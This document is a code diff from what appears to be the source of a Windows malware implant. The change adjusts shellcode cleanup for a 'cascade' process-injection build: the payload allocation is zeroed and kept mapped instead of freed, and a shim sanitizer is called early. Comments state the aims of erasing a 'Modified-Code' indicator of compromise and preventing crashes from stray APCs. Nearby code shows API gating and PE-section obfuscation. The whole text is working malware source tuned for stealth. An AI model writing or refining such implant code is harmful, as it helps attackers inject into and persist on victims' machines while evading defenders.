@@ -667,8 +667,15 @@ static VOID cleanup_shellcode(PINSTANCE inst) {
         gate_VirtualProtect(inst, inst->pOriginalAlloc,
             inst->szOriginalAlloc, PAGE_READWRITE, &old_prot);
         es_memset(inst->pOriginalAlloc, 0, inst->szOriginalAlloc);
+#if !defined(INJECTION_TECHNIQUE) || INJECTION_TECHNIQUE != 5 /* not cascade */
+        // Cascade builds keep the allocation (see agent_main comment): a
+        // pending pre-sanitizer APC still points here; freeing recycles the
+        // pages and a late APC executes recycled memory.
         gate_VirtualFree(inst, inst->pOriginalAlloc, 0, MEM_RELEASE);
         DBG(inst, "[ES] Cleanup: freed private shellcode allocation");
+#else
+        DBG(inst, "[ES] Cleanup: zeroed private shellcode allocation (cascade: kept)");
+#endif
     } else if (mbi.Type == MEM_IMAGE) {
         gate_VirtualProtect(inst, inst->pOriginalAlloc,
             inst->szOriginalAlloc, PAGE_READWRITE, &old_prot);
@@ -738,6 +745,14 @@ static VOID obfuscate_pe_sections(PINSTANCE inst, PVOID dll_base) {
 
 VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
     SALT_RETAIN(inst);   // build-randomisation sink: keeps the per-build salt alive
+#if defined(INJECTION_TECHNIQUE) && INJECTION_TECHNIQUE == 5 /* INJECT_CASCADE */
+    // Kill the shim-callback re-invocation window before anything can free
+    // the payload allocation (see cascade_sanitize_shims comment). Declared
+    // here because injection.h only exposes inject_cascade under the same
+    // condition - the forward declaration lives with the definition.
+    VOID cascade_sanitize_shims(PINSTANCE inst);
+    cascade_sanitize_shims(inst);
+#endif
     resolve_apis(inst);
     DBG(inst, "[ES] APIs resolved");
     parse_config(inst, CONFIG_BYTES, sizeof(CONFIG_BYTES));
@@ -1345,9 +1360,17 @@ VOID agent_main(PINSTANCE inst) {
                 inst->szOriginalAlloc, PAGE_READWRITE, &_mso);
         }
         es_memset(inst->pOriginalAlloc, 0, inst->szOriginalAlloc);
+#if !defined(INJECTION_TECHNIQUE) || INJECTION_TECHNIQUE != 5 /* not cascade */
+        // Cascade builds keep this allocation reserved: a pending APC queued
+        // before the shim sanitizer ran still points here, and freeing lets
+        // the loader recycle the pages - a late APC then AVs executing api-set
+        // name strings (dump-verified rundll32.exe.7636.dmp). Zeroing kills
+        // the Modified-Code IoC; the anonymous RW region stays mapped and a
+        // stray re-entry faults on zeroed non-code instead of live strings.
         if (inst->Win32.VirtualFree) {
             inst->Win32.VirtualFree(inst->pOriginalAlloc, 0, MEM_RELEASE);
         }
+#endif
         inst->pOriginalAlloc = NULL;
         inst->szOriginalAlloc = 0;
     }
